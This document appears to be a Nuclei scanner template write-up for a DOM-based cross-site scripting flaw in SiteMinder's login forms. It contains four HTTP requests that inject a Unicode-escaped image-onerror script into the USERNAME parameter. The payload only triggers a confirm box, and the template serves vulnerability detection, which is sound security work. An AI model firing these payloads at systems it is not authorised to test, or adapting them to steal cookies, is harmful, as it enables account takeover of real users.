# Nuclei Template: SiteMinder - DOM Cross-Site Scripting
**Template ID:** siteminder-dom-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`siteminder-dom-xss.yaml`)

## Vulnerability Information & PoC

## Description
SiteMinder contains a cross-site scripting vulnerability in the document object model. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7
```

## References
- https://blog.reigningshells.com/2019/12/reviving-old-cves-reflected-xss-in-ca.html
- https://github.com/projectdiscovery/nuclei-templates/issues/2736
